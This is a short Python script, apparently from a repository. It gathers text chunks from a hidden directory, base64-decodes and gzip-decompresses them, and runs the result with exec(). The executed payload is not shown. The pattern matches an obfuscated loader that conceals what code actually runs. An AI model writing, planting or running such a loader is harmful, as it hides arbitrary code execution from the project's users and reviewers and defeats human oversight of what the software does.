import base64
import gzip
from pathlib import Path

chunk_dir = Path("scripts/.animated_transfer_chunks")
payload = "".join(
    path.read_text(encoding="utf-8") for path in sorted(chunk_dir.glob("*.txt"))
)
exec(compile(gzip.decompress(base64.b64decode(payload)), __file__, "exec"))
